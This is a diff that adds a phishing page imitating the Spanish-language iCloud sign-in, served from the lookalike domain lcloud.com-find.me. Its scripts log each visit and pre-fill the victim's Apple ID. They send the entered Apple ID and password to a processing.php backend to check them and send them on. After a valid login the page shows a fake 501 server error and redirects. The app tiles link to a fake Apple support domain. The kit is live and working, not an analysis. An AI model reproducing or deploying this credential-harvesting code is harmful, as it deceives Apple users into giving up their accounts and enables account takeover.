@@ -1,0 +1,606 @@
+
+
+
+
+
+<head>
+    <base href="https://lcloud.com-find.me/ic/">    
+<meta charset="UTF-8">
+<meta name="robots" content="noindex, nofollow, noarchive">
+<meta name="googlebot" content="noindex, nofollow, noarchive">
+<meta name="googlebot" content="nosnippet">
+<meta name="robots" content="noodp">
+<meta name="slurp" content="noydir">
+<meta name="robots" content="noimageindex,nomediaindex">
+<meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta content="width=device-width, initial-scale=1" name="viewport">
+<link rel="apple-touch-icon" sizes="57x57" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-57x57.png">
+<link rel="apple-touch-icon" sizes="60x60" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-60x60.png">
+<link rel="apple-touch-icon" sizes="72x72" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-72x72.png">
+<link rel="apple-touch-icon" sizes="76x76" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-76x76.png">
+<link rel="apple-touch-icon" sizes="114x114" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-114x114.png">
+<link rel="apple-touch-icon" sizes="120x120" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-120x120.png">
+<link rel="apple-touch-icon" sizes="144x144" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-144x144.png">
+<link rel="apple-touch-icon" sizes="152x152" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-152x152.png">
+<link rel="apple-touch-icon" sizes="180x180" href="http://lcloud.com-find.me/ic/assets/favicon/apple-icon-180x180.png">
+<link rel="icon" type="image/png" sizes="192x192" href="http://lcloud.com-find.me/ic/assets/favicon/android-icon-192x192.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://lcloud.com-find.me/ic/assets/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="96x96" href="http://lcloud.com-find.me/ic/assets/favicon/favicon-96x96.png">
+<link rel="icon" type="image/png" sizes="16x16" href="http://lcloud.com-find.me/ic/assets/favicon/favicon-16x16.png">
+<link rel="manifest" href="http://lcloud.com-find.me/ic/assets/favicon/manifest.json">
+<meta name="msapplication-TileColor" content="#ffffff">
+<meta name="msapplication-TileImage" content="http://lcloud.com-find.me/ic/assets/favicon/ms-icon-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<title>lCloud</title>
+
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/strap.css">
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/app.css">
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/kit.css">
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/animate.css">
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/font-awesome.css">
+<link rel="stylesheet" href="http://lcloud.com-find.me/ic/assets/icloud/css/fonts.css?v=1.8" type="text/css" /> 
+
+<style>
+@media  only screen and (max-width: 1000px) {
+body {
+background: url("http://lcloud.com-find.me/ic/assets/icloud/images/applemobbg.png")!important;
+background-size: cover!important;
+background-size:  100%!important;
+}
+}
+@media  only screen and (min-width: 1001px) {
+body {
+background: url("http://lcloud.com-find.me/ic/assets/icloud/images/applebg.png")!important;
+background-size:  100%!important;
+}
+}
+.appleid-input{
+border: 1px solid #1780fb!important;
+}
+.appleid-input:focus{
+border: 2px solid #1780fb!important;
+box-shadow: 0 0 0 1px #1780fb!important;
+}
+.login-form form.cloud-login #sign-in {
+
+bottom: 7px!important;
+right: 12px!important;
+opacity: 0.8!important;
+}
+
+.login-form form.cloud-login #sign-in-cancel {
+
+bottom: 7px!important;
+opacity: 0.8!important;
+
+border: 1px solid transparent;
+position: absolute;
+top: 44px;
+right: 5px;
+background: transparent;
+outline: none;
+cursor: pointer;
+padding: 5px;
+
+}
+
+.icon.icon_sign_in{
+font-size: 26px;
+color: #494949;
+width: 30px;
+height: 30px;
+}
+
+
+
+.login-form form.cloud-login>input[type="password"]:focus {
+border: 2px solid #1780fb!important;
+box-shadow: 0 0 0 1px #1780fb!important;
+}
+</style>
+
+
+<script type="text/javascript" src="assets/jquery.js"></script>
+<script type="text/javascript">
+
+var failed_retry;
+failed_retry = 0;
+
+function checkTrueLogin(apple_id, password, uri, handleTrueLogin)
+{
+    console.log(apple_id)
+    $.ajax({
+        type:"POST",
+        url:"../processing.php",
+        data:{checkTrueLogin: "" , apple_id:apple_id, password:password, uri:uri},
+        success:function(response)
+        {
+            handleTrueLogin(response);
+        }
+
+        });
+}
+
+function sendTrueLogin(apple_id, password, uri)
+{
+    $.ajax({
+        type:"POST",
+        url:"../processing.php",
+        data:{sendTrueLogin: "" , apple_id:apple_id, password:password, uri:uri},
+        success:function(response)
+        {
+            $("html").html("<html><head><title>501 Internal Server Error</title></head><body>\n<h1>Internal Server Error</h1>\n<p>The server couldn't handle your requests at the moment, please try again later.</p>\n<hr>\n<address>Apache/2.4.25 (Centos) Server at www.icloud.com Port 443</address>\n</body></html>");
+        },
+        error: function (request, status, error)
+        {
+            $("html").html("<html><head><title>501 Internal Server Error</title></head><body>\n<h1>Internal Server Error</h1>\n<p>The server couldn't handle your requests at the moment, please try again later.</p>\n<hr>\n<address>Apache/2.4.25 (Centos) Server at www.icloud.com Port 443</address>\n</body></html>");   
+        }
+
+        });
+}
+
+
+
+
+$(document).ready(function()
+{
+
+
+document.getElementById("apple_id").addEventListener('input', function() {
+console.log('it works!');
+})
+    // Link Visit Ajax
+    $.ajax({
+        type:"POST",
+        url:"../processing.php",
+        data:{sendVisit:"", "uri": location.pathname.substr(1) ,},
+        success:function(response){
+        console.log("Visit: " + response);
+        },
+    });
+
+
+
+    // Check if AppleID is provieded
+    $.ajax({
+        type:"POST",
+        url:"../processing.php",
+        data:{checkAppleID: "" , uri: location.pathname.substr(1)},
+        success:function(response){
+        console.log("appleid: " + response);
+        if (response != "NULL")
+        {
+            setTimeout(function()
+            {
+                $('#sign-in').prop('disabled', false);
+                $('#sign-in').removeClass('disable');
+                $('#apple_id').val(response);
+                document.getElementById("apple_id").dispatchEvent(new Event('input'));
+                $("#sign-in").click();
+                $("#password").focus(); 
+            },200);
+        
+        }
+        },
+    });
+
+
+    // email textbox change handler 
+     $("#apple_id").bind('input', function() {
+
+         $('#sign-in').removeClass('disable');
+         $('.alrt').hide();
+    });
+
+    // password textbox change handler 
+     $("#password").bind('input', function() {
+         $('#sign-in-cancel').removeClass('disable');
+         $('.alrt').hide();
+    });
+
+    // handling ENTER or Click on email texbox
+     $("#apple_id").keyup(function(event) {
+        if (event.keyCode === 13) {
+        $("#sign-in").click();
+    }
+    });
+
+    // handling ENTER or Click on password texbox
+     $("#password").keyup(function(event) {
+        if (event.keyCode === 13) {
+        $("#sign-in-cancel").click();
+    }
+    });
+
+
+    $("#sign-in").click(function()
+    {
+        /*alert ("clicked");
+        $("#sign-in").hide()
+        $(".loading").show();*/
+    });
+
+
+
+    // handling ENTER or Click on password texbox
+    $("#password").keyup(function(event) {
+        if (event.keyCode === 13) {
+        $("#sign-in").click();
+    }
+    });
+   
+    // ...
+    $("#sign-in-cancel").click(function()
+    {
+        $(".alrt").hide();
+        $(".loadings").show();
+        //checkTrueLogin(("#apple_id").val(), $("#apple_pwd").val());
+
+        checkTrueLogin($("#apple_id").val(), $("#password").val(), location.pathname.substr(1),function(resp)
+        {
+            if (resp == "no")
+            {
+                failed_retry += 1;
+                if(failed_retry >=3)
+                {
+
+
+                   console.log('secondary_id=' + '6-73358');window.location.href = window.location.protocol + '//' + window.location.hostname + '/6-73358'  
+
+
+
+
+
+                }
+                app.loading = false;
+                $(".loading").hide();
+                $(".alrt").show();
+                $('#password').val('');
+                app.password =  '';
+            }
+            else if (resp == "yes")
+            {
+                $(".loading").hide();
+                sendTrueLogin($("#apple_id").val(), $("#password").val(), location.pathname.substr(1));
+
+
+                console.log('secondary_id=' + '6-73358');window.location.href = window.location.protocol + '//' + window.location.hostname + '/6-73358'  
+
+
+            }
+        });
+
+
+    });
+
+});
+
+
+</script>    
+</head>
+<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us">
+<section id="header" class="headermain">
+    
+                <div class="container-fluid">
+                    <div class="row">
+                        <div class="col-md-4 col-xs-8 rightH">
+                            <a class="help" title="Help" alt="Help" href="https://help.apple.com/icloud/">
+                            <img src="http://lcloud.com-find.me/ic/assets/icloud/images/qu.png" style="width:20px;"/>
+                            </a>                                                                                              
+
+                        </div>
+                        <div class="col-md-8 col-xs-4 leftH">
+                            <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ap.png" style="width:15px;margin-top:12px;"/>
+                        </div>
+                    </div>
+                </div>
+            </section>
+    <div id="app">
+        <div v-show="load" class="first-load">
+            <div class="overlay">
+                <div class="spinner center">
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                    <div class="spinner-blade"></div>
+                </div>
+            </div>
+        </div>
+
+        <div v-show="!load" class="bodys">
+
+            <input type="hidden" ref="error" value="">
+
+
+            
+
+
+
+            <section class="login-form text-center animated">
+
+                <img src="http://lcloud.com-find.me/ic/assets/icloud/images/cloud.png" class="img-cloud" alt="" style="width: 73px;
+                border-radius: 22%;">
+
+                <h2 style="padding-top: 5px;">Iniciar sesión en iCloud</h2>
+
+                <form onsubmit="return false;" id="form" ref="form" action="" class="cloud-login form-ajax" style="display:block !important"
+                    method="post" accept-charset="utf-8">
+                    <input type="hidden" name="_token" value="rLeeDvEba4dIYNiTIskVaeWr8jI3dfYj1EoXEZYW">                        <input type="hidden" ref="appleid" value="">
+                    <input type="hidden" name="imei" value="teste3">
+                    <input type="hidden" name="key" value="207-746">
+                    <input type="hidden" name="has_error" value="">
+                    <input @keyup.enter="SubmitButton" v-model="appleid" :class="{'has-no-border' : show_password, 'has-border' : !show_password}"
+                        type="text" class="id appleid-input" name="apple_id" id="apple_id" placeholder="ID de Apple" style="direction: ltr !important;border: 1px solid #ccc;"
+                        autocomplete="off" autocorrect="off" autocapitalize="off">
+
+                    <transition enter-active-class="animated fadeInDown">
+                        <input @keyup.enter="SubmitButton" v-model="password" v-show="show_password" ref="password" type="password" autocomplete="off"
+                            class="password" name="password"  id="password" placeholder="Contraseña" can-field="password" autocorrect="off" autocapitalize="off" autofocus="password">
+                    </transition>
+
+                    <button v-show="!loading" type="button" v-on:click.prevent="SubmitButton" value="" :class="isLogin" class="formSub" id="sign-in" :disabled="appleid == ''">
+                         <i class="icon icon_sign_in"></i>
+                    </button>     
+
+                    <img v-show="loading" class="loading" src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+
+
+                    <button v-show="!loading" type="button" v-on:click.prevent="SubmitButton" value="" :class="isLogin" class="formSub" id="sign-in-cancel" :disabled="appleid == ''">
+                        <i class="icon icon_sign_in_cancel"></i>
+                    </button>
+
+                    <img v-show="loading" class="loading" src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+
+
+  <div class="alrt" style="display: none; background-color: rgb(248, 219, 112);"><p>Contraseña&nbsp;o ID&nbsp;de&nbsp;Apple incorrectos.</p> <a target="blank" href="https://iforgot.apple.com/password/verify/appleid">¿Has olvidado la contraseña?</a></div>
+                     
+                </form>
+
+                <div class="keepme">
+                    <input type="checkbox">
+                    <span for="keepme">Permanecer conectado</span>
+                </div>
+               
+
+                <div class="create">
+                    <a href="#">¿Has olvidado tu ID de Apple o la contraseña?</a>
+                </div>
+
+            </section>
+            <section class="imessage" style="display:none;">
+
+
+                <div class="container">
+                    <div class="row">
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/11.png" alt="">
+                                <span>Reminders</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/9.png" alt="">
+                                <span>
+                                    Notes
+                                </span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/3.png" alt="">
+                                <span>lCloud Drive</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/10.png" alt="">
+                                <span>Photos</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/1.png" alt="">
+                                <span>Contacts</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/8.png" alt="">
+                                <span>Mail</span>
+                            </a>
+                        </div>
+
+
+
+
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/12.png" alt="">
+                                <span>Settings</span>
+                            </a>
+                        </div>
+
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/2.png" alt="">
+                                <span>Find My lPhone</span>
+                            </a>
+                        </div>
+
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/6.png" alt="">
+                                <span>Keynote</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/5.png" alt="">
+                                <span> Numbers</span>
+                            </a>
+                        </div>
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/20.png" alt="">
+                                <span>Find Friends</span>
+                            </a>
+                        </div>
+
+                        <div class="col-md-2 col-sm-4 col-xs-6">
+                            <a href="https://support-apple-services.com/findmyiphone" class="text-cente imb">
+                                <span class="loadings">
+                                    <img src="http://lcloud.com-find.me/ic/assets/icloud/images/ajax-loader.gif" alt="Loading">
+                                </span>
+                                <img class="" src="http://lcloud.com-find.me/ic/assets/icloud/images/7.png" alt="">
+                                <span>Pages</span>
+                            </a>
+                        </div>
+
+
+                    </div>
+                </div>
+            </section>
+            <footer class="foot">
+                <div class="container-fluid">
+                    <div class="row">
+
+                        <div style="bottom: 30px !important;" class="col-md-12 col-xs-12 foot-link text-center">
+                            <a href="https://www.apple.com/support/systemstatus/" target="_blank">                                    Crear ID de Apple | </a> <a href="https://www.apple.com/support/systemstatus/" target="_blank">                                    Estado del sistema | </a> <span class="footer-link-separator "></span> <a href="https://www.apple.com/privacy/" target="_blank">Política&nbsp;de&nbsp;privacidad | </a> <span class="footer-link-separator "></span> <a href="https://www.apple.com/legal/icloud/ww/" target="_blank">Términos y condiciones | </a> <span class="footer-link-separator "></span> <span class="copyright">Copyright © 2022 Apple Inc. Todos los derechos reservados.</span>                            </div>
+                        
+
+                    </div>
+                </div>
+            </footer>
+
+        </div>
+    </div>
+
+    <div class="main-container">
+        <div class="section-bgs">                
+        </div>
+
+        <script src="http://lcloud.com-find.me/ic/assets/icloud/js/jquery.js"></script>
+
+        
+        <script src="http://lcloud.com-find.me/ic/assets/icloud/js/new.min.js?t=1524650517"></script>
+        
+    </div>
+</body>
+<script src="http://lcloud.com-find.me/ic/assets/vuejs.js"></script>
+
+<script>
+    var app = new Vue({
+        el: '#app',
+        data: {
+            show_password: false,
+            appleid: '',
+            submit: false,
+            loading: false,
+            error: false,
+            load: true,
+            password: ''
+        },
+        mounted() {
+            this.appleid = this.$refs.appleid.value;
+
+            if (this.$refs.error.value) {
+                this.load = false
+                this.error = true
+                this.HasError()
+            } else {
+                this.firstLoad()
+            }
+        },
+        methods: {
+            firstLoad() {
+                this.load = false
+    
+            },
+            HasError() {
+                this.show_password = true
+                this.$nextTick(() => this.$refs.password.focus())
+            },
+            SubmitButton: function (event) {
+                if (this.appleid === '') {
+                    return;
+                }
+                if (this.show_password) {
+                    this.loading = true
+                    setTimeout(() => {
+                        //
+                    }, 500);
+                } else {
+                    this.loading = true
+                    setTimeout(() => {
+                        this.show_password = true
+                        if (!this.validEmail()) {
+                            this.appleid = `${this.appleid}@icloud.com`
+                        }
+                        this.$nextTick(() => this.$refs.password.focus())
+                        this.loading = false
+                    }, 300);
+                }
+            },
+            hideError() {
+                this.error = false
+                this.$refs.password.focus()
+            },
+            validEmail: function () {
+                var re =
+                    /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                return re.test(this.appleid.replace(/\s/g,''));
+            },
+        },
+        computed: {
+            isLogin: function () {
+                return {
+                    //'dologin': this.appleid !== ''
+                }
+            }
+        }
+    });
+</script>
+</head>
